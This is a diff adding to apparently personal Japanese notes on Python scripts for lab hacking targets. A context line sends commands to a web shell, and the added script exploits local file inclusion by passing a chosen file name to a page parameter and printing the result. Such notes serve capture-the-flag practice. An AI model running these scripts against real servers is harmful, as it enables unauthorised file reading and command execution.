@@ -66,3 +66,20 @@ url = f'http://10.10.11.116/webshell.php?cmd={cmd}'
 
 r = s.get(url)
 ```
+
+## 例
+LFI用。コマンドライン引数にファイル名を入力する。
+```python
+import sys
+from requests_html import HTMLSession
+
+s = HTMLSession()
+
+url = f'http://10.10.10.194/news.php?file={sys.argv[1]}'
+print(f'url: {url}')
+
+r = s.get(url)
+
+print(r.text) # htmlを表示
+print(r.html.text) # inner textのみ表示
+```
